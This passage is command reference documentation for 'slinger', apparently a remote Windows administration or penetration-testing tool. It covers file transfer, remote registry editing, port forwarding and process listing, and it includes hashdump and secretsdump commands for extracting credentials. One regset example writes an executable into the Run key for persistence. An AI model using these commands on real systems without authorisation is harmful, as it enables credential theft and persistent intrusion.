  remote_path  Specify the remote file path to upload to, optional

options:
  -h, --help   show this help message and exit

Example Usage: upload /local/path /remote/path

```

**Example Usage:**
```
Example Usage: upload /local/path /remote/path
```

### Arguments

- **`local_path`**: Specify the local file path to upload
  - Required: Yes

- **`remote_path`**: Specify the remote file path to upload to, optional
  - Required: No

---

## `put`

**Description:** Upload a file to the remote server

**Help:**
```
usage: slinger upload [-h] local_path [remote_path]

Upload a file to the remote server

positional arguments:
  local_path   Specify the local file path to upload
  remote_path  Specify the remote file path to upload to, optional

options:
  -h, --help   show this help message and exit

Example Usage: upload /local/path /remote/path

```

**Example Usage:**
```
Example Usage: upload /local/path /remote/path
```

### Arguments

- **`local_path`**: Specify the local file path to upload
  - Required: Yes

- **`remote_path`**: Specify the remote file path to upload to, optional
  - Required: No

---

## `download`

**Description:** Download a file from the remote server

**Help:**
```
usage: slinger download [-h] remote_path [local_path]

Download a file from the remote server

positional arguments:
  remote_path  Specify the remote file path to download
  local_path   Specify the local file path to download to, optional

options:
  -h, --help   show this help message and exit

Example Usage: download /remote/path /local/path

```

**Example Usage:**
```
Example Usage: download /remote/path /local/path
```

### Arguments

- **`remote_path`**: Specify the remote file path to download
  - Required: Yes

- **`local_path`**: Specify the local file path to download to, optional
  - Required: No

---

## `get`

**Description:** Download a file from the remote server

**Help:**
```
usage: slinger download [-h] remote_path [local_path]

Download a file from the remote server

positional arguments:
  remote_path  Specify the remote file path to download
  local_path   Specify the local file path to download to, optional

options:
  -h, --help   show this help message and exit

Example Usage: download /remote/path /local/path

```

**Example Usage:**
```
Example Usage: download /remote/path /local/path
```

### Arguments

- **`remote_path`**: Specify the remote file path to download
  - Required: Yes

- **`local_path`**: Specify the local file path to download to, optional
  - Required: No

---

## `mget`

**Description:** Download all files from a specified directory and its subdirectories

**Help:**
```
usage: slinger mget [-h] [-r] [-p regex] [-d D] [remote_path] [local_path]

Download all files from a specified directory and its subdirectories

positional arguments:
  remote_path  Specify the remote directory path to download from
  local_path   Specify the local directory path where files will be downloaded

options:
  -h, --help   show this help message and exit
  -r           Recurse into directories
  -p regex     Specify a regex pattern to match filenames
  -d D         Specify folder depth count for recursion

Example Usage: mget /remote/path /local/path

```

**Example Usage:**
```
Example Usage: mget /remote/path /local/path
```

### Arguments

- **`remote_path`**: Specify the remote directory path to download from
  - Required: No

- **`local_path`**: Specify the local directory path where files will be downloaded
  - Required: No

- **`p`**: Specify a regex pattern to match filenames
  - Required: No

- **`d`**: Specify folder depth count for recursion
  - Default: `2`
  - Required: No

---

## `mkdir`

**Description:** Create a new directory on the remote server

**Help:**
```
usage: slinger mkdir [-h] path

Create a new directory on the remote server

positional arguments:
  path        Specify the path of the directory to create

options:
  -h, --help  show this help message and exit

Example Usage: mkdir /path/to/new/directory

```

**Example Usage:**
```
Example Usage: mkdir /path/to/new/directory
```

### Arguments

- **`path`**: Specify the path of the directory to create
  - Required: Yes

---

## `rmdir`

**Description:** Remove a directory on the remote server

**Help:**
```
usage: slinger rmdir [-h] remote_path

Remove a directory on the remote server

positional arguments:
  remote_path  Specify the remote path of the directory to remove

options:
  -h, --help   show this help message and exit

Example Usage: rmdir /path/to/remote/directory

```

**Example Usage:**
```
Example Usage: rmdir /path/to/remote/directory
```

### Arguments

- **`remote_path`**: Specify the remote path of the directory to remove
  - Required: Yes

---

## `rm`

**Description:** Delete a file on the remote server

**Help:**
```
usage: slinger rm [-h] remote_path

Delete a file on the remote server

positional arguments:
  remote_path  Specify the remote file path to delete

options:
  -h, --help   show this help message and exit

Example Usage: rm /path/to/remote/file

```

**Example Usage:**
```
Example Usage: rm /path/to/remote/file
```

### Arguments

- **`remote_path`**: Specify the remote file path to delete
  - Required: Yes

---

## `#shell`

**Description:** Enter local terminal mode for command execution

**Help:**
```
usage: slinger #shell [-h]

Enter local terminal mode for command execution

options:
  -h, --help  show this help message and exit

Example Usage: #shell

```

**Example Usage:**
```
Example Usage: #shell
```

---

## `!`

**Description:** Run a specified local command

**Help:**
```
usage: slinger ! [-h] ...

Run a specified local command

positional arguments:
  commands    Specify the local commands to run

options:
  -h, --help  show this help message and exit

Example Usage: ! ls -l

```

**Example Usage:**
```
Example Usage: ! ls -l
```

### Arguments

- **`commands`**: Specify the local commands to run
  - Required: No

---

## `info`

**Description:** Display the status of the current session

**Help:**
```
usage: slinger info [-h]

Display the status of the current session

options:
  -h, --help  show this help message and exit

Example Usage: info

```

**Example Usage:**
```
Example Usage: info
```

---

## `reguse`

**Description:** Connect to a remote registry on the remote server

**Help:**
```
usage: slinger reguse [-h]

Connect to a remote registry on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: reguse

```

**Example Usage:**
```
Example Usage: reguse
```

---

## `regstart`

**Description:** Connect to a remote registry on the remote server

**Help:**
```
usage: slinger reguse [-h]

Connect to a remote registry on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: reguse

```

**Example Usage:**
```
Example Usage: reguse
```

---

## `regstop`

**Description:** Disconnect from a remote registry on the remote server

**Help:**
```
usage: slinger regstop [-h]

Disconnect from a remote registry on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: regstop

```

**Example Usage:**
```
Example Usage: regstop
```

---

## `regquery`

**Description:** Query a registry key on the remote server

**Help:**
```
usage: slinger regquery [-h] [-l] [-v] key

Query a registry key on the remote server

positional arguments:
  key          Specify the registry key to query

options:
  -h, --help   show this help message and exit
  -l, --list   List all subkeys in the registry key
  -v, --value  Enumerate the value of the specified registry key

Example Usage: regquery HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run

```

**Example Usage:**
```
Example Usage: regquery HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
```

### Arguments

- **`key`**: Specify the registry key to query
  - Required: Yes

---

## `regset`

**Description:** Set a registry value on the remote server

**Help:**
```
usage: slinger regset [-h] -k KEY -v VALUE -d DATA [-t TYPE]

Set a registry value on the remote server

options:
  -h, --help            show this help message and exit
  -k KEY, --key KEY     Specify the registry key to set
  -v VALUE, --value VALUE
                        Specify the registry value to set
  -d DATA, --data DATA  Specify the registry data to set
  -t TYPE, --type TYPE  Specify the registry type to set

Example Usage: regset -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ -v test -d "C:\test.exe"

```

**Example Usage:**
```
Example Usage: regset -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ -v test -d "C:\test.exe"
```

### Arguments

- **`key`**: Specify the registry key to set
  - Required: Yes

- **`value`**: Specify the registry value to set
  - Required: Yes

- **`data`**: Specify the registry data to set
  - Required: Yes

- **`type`**: Specify the registry type to set
  - Default: `REG_SZ`
  - Required: No

---

## `regdel`

**Description:** Delete a registry value on the remote server

**Help:**
```
usage: slinger regdel [-h] -k KEY [-v VALUE]

Delete a registry value on the remote server

options:
  -h, --help            show this help message and exit
  -k KEY, --key KEY     Specify the registry key to delete
  -v VALUE, --value VALUE
                        Specify the registry value to delete

Example Usage: regdel -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ -v test

```

**Example Usage:**
```
Example Usage: regdel -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ -v test
```

### Arguments

- **`key`**: Specify the registry key to delete
  - Required: Yes

- **`value`**: Specify the registry value to delete
  - Required: No

---

## `regcreate`

**Description:** Create a registry key on the remote server

**Help:**
```
usage: slinger regcreate [-h] key

Create a registry key on the remote server

positional arguments:
  key         Specify the registry key to create

options:
  -h, --help  show this help message and exit

Example Usage: regcreate -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\test

```

**Example Usage:**
```
Example Usage: regcreate -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\test
```

### Arguments

- **`key`**: Specify the registry key to create
  - Required: Yes

---

## `regcheck`

**Description:** Check if a registry key exists on the remote server.  This is really just an exposed helper function.

**Help:**
```
usage: slinger regcheck [-h] key

Check if a registry key exists on the remote server. This is really just an exposed helper function.

positional arguments:
  key         Specify the registry key to check

options:
  -h, --help  show this help message and exit

Example Usage: regcheck HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\test

```

**Example Usage:**
```
Example Usage: regcheck HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\test
```

### Arguments

- **`key`**: Specify the registry key to check
  - Required: Yes

---

## `portfwd`

**Description:** Forward a local port to a remote port on the remote server

**Help:**
```
usage: slinger portfwd [-h] (-d | -a | -l | -c | --load) local remote

Forward a local port to a remote port on the remote server

positional arguments:
  local         Specify the local host and port to forward from
  remote        Specify the remote host and port to forward to

options:
  -h, --help    show this help message and exit
  -d, --remove  Remove a port forwarding rule
  -a, --add     Add a port forwarding rule
  -l, --list    List all port forwarding rules
  -c, --clear   Clear all port forwarding rules
  --load        Load all port forwarding rules from the registry

Example Usage: portfwd (-a|-d) [lhost]:[lport] [rhost]:[rport]

```

**Example Usage:**
```
Example Usage: portfwd (-a|-d) [lhost]:[lport] [rhost]:[rport]
```

### Arguments

- **`local`**: Specify the local host and port to forward from
  - Required: Yes

- **`remote`**: Specify the remote host and port to forward to
  - Required: Yes

---

## `ifconfig`

**Description:** Display network interfaces on the remote server

**Help:**
```
usage: slinger ifconfig [-h]

Display network interfaces on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: ifconfig

```

**Example Usage:**
```
Example Usage: ifconfig
```

---

## `ipconfig`

**Description:** Display network interfaces on the remote server

**Help:**
```
usage: slinger ifconfig [-h]

Display network interfaces on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: ifconfig

```

**Example Usage:**
```
Example Usage: ifconfig
```

---

## `enuminterfaces`

**Description:** Display network interfaces on the remote server

**Help:**
```
usage: slinger ifconfig [-h]

Display network interfaces on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: ifconfig

```

**Example Usage:**
```
Example Usage: ifconfig
```

---

## `hostname`

**Description:** Display the hostname of the remote server

**Help:**
```
usage: slinger hostname [-h]

Display the hostname of the remote server

options:
  -h, --help  show this help message and exit

Example Usage: hostname

```

**Example Usage:**
```
Example Usage: hostname
```

---

## `procs`

**Description:** List running processes on the remote server

**Help:**
```
usage: slinger procs [-h] [-v] [-t]

List running processes on the remote server

options:
  -h, --help     show this help message and exit
  -v, --verbose  Display verbose process information
  -t, --tree     Display process tree

Example Usage: procs -t -v

```

**Example Usage:**
```
Example Usage: procs -t -v
```

---

## `ps`

**Description:** List running processes on the remote server

**Help:**
```
usage: slinger procs [-h] [-v] [-t]

List running processes on the remote server

options:
  -h, --help     show this help message and exit
  -v, --verbose  Display verbose process information
  -t, --tree     Display process tree

Example Usage: procs -t -v

```

**Example Usage:**
```
Example Usage: procs -t -v
```

---

## `tasklist`

**Description:** List running processes on the remote server

**Help:**
```
usage: slinger procs [-h] [-v] [-t]

List running processes on the remote server

options:
  -h, --help     show this help message and exit
  -v, --verbose  Display verbose process information
  -t, --tree     Display process tree

Example Usage: procs -t -v

```

**Example Usage:**
```
Example Usage: procs -t -v
```

---

## `fwrules`

**Description:** Display firewall rules on the remote server

**Help:**
```
usage: slinger fwrules [-h]

Display firewall rules on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: fwrules

```

**Example Usage:**
```
Example Usage: fwrules
```

---

## `set`

**Description:** Set a variable for use in the application

**Help:**
```
usage: slinger set [-h] varname value

Set a variable for use in the application

positional arguments:
  varname     Set the debug variable to True or False
  value       Set the mode variable to True or False

options:
  -h, --help  show this help message and exit

Example Usage: set varname value

```

**Example Usage:**
```
Example Usage: set varname value
```

### Arguments

- **`varname`**: Set the debug variable to True or False
  - Required: Yes

- **`value`**: Set the mode variable to True or False
  - Required: Yes

---

## `config`

**Description:** Show the current config

**Help:**
```
usage: slinger config [-h]

Show the current config

options:
  -h, --help  show this help message and exit

Example Usage: config

```

**Example Usage:**
```
Example Usage: config
```

---

## `run`

**Description:** Run a slinger script or command sequence

**Help:**
```
usage: slinger run [-h] (-c CMD_CHAIN | -f FILE)

Run a slinger script or command sequence

options:
  -h, --help            show this help message and exit
  -c CMD_CHAIN, --cmd_chain CMD_CHAIN
                        Specify a command sequence to run
  -f FILE, --file FILE  Specify a script file to run

Example Usage: run -c|-f [script]

```

**Example Usage:**
```
Example Usage: run -c|-f [script]
```

### Arguments

- **`cmd_chain`**: Specify a command sequence to run
  - Required: No

- **`file`**: Specify a script file to run
  - Required: No

---

## `hashdump`

**Description:** Dump hashes from the remote server

**Help:**
```
usage: slinger hashdump [-h]

Dump hashes from the remote server

options:
  -h, --help  show this help message and exit

Example Usage: hashdump

```

**Example Usage:**
```
Example Usage: hashdump
```

---

## `secretsdump`

**Description:** Dump secrets from the remote server

**Help:**
```
usage: slinger secretsdump [-h]

Dump secrets from the remote server

options:
  -h, --help  show this help message and exit

Example Usage: secretsdump

```

**Example Usage:**
```
Example Usage: secretsdump
```

---

## `env`

**Description:** Display environment variables on the remote server

**Help:**
```
usage: slinger env [-h]

Display environment variables on the remote server

options:
  -h, --help  show this help message and exit

Example Usage: env

```

**Example Usage:**
```
Example Usage: env
```

---

## `debug-availcounters`

**Description:** Display available performance counters on the remote server.  This is for debug use only, it doesn't really give you anything.

**Help:**
```
usage: slinger debug-availcounters [-h] [-f FILTER] [-p] [-s filename]

Display available performance counters on the remote server. This is for debug use only, it doesn't really give you anything.

options:
  -h, --help            show this help message and exit
  -f FILTER, --filter FILTER
                        Simple filter for case insenstive counters containing a given string
  -p, --print           Print the available counters to the screen. Must be provide with -s if you want to print to screen.
  -s filename, --save filename
                        Save the available counters to a file

Example Usage: availcounters

```

**Example Usage:**
```
Example Usage: availcounters
```

### Arguments

- **`filter`**: Simple filter for case insenstive counters containing a given string
  - Required: No

- **`save`**: Save the available counters to a file
  - Required: No

---

## `debug-counter`

**Description:** Display a performance counter on the remote server.  This is for debug use only, it doesn't really give you anything.

**Help:**
```
usage: slinger debug-counter [-h] [-c COUNTER] [-a {x86,x64,unk}] [-i]

Display a performance counter on the remote server. This is for debug use only, it doesn't really give you anything.

options:
  -h, --help            show this help message and exit
  -c COUNTER, --counter COUNTER
                        Specify the counter to display
  -a {x86,x64,unk}, --arch {x86,x64,unk}
                        Specify the architecture of the remote server
  -i, --interactive     Run the counter in interactive mode

Example Usage: counter -c 123 [-a x86]

```

**Example Usage:**
```
Example Usage: counter -c 123 [-a x86]
```

### Arguments

- **`counter`**: Specify the counter to display
  - Required: No

- **`arch`**: Specify the architecture of the remote server
  - Choices: x86, x64, unk
  - Default: `unk`
  - Required: No

---

## `network`

**Description:** Display network information on the remote server

**Help:**
```
usage: slinger network [-h] [-tcp] [-rdp]

Display network information on the remote server

options:
  -h, --help  show this help message and exit
  -tcp        Display TCP information
  -rdp        Display RDP information

Example Usage: network

```

**Example Usage:**
```
Example Usage: network
```

---

## `reload`

**Description:** Reload the current sessions context

**Help:**
```
usage: slinger reload [-h]

Reload the current sessions context

options:
  -h, --help  show this help message and exit

Example Usage: reload

```

**Example Usage:**
```
Example Usage: reload
```

---

## `plugins`

**Description:** List available plugins

**Help:**
```
usage: slinger plugins [-h]

List available plugins

options:
  -h, --help  show this help message and exit

Example Usage: plugins

```

**Example Usage:**
```
Example Usage: plugins
```

---

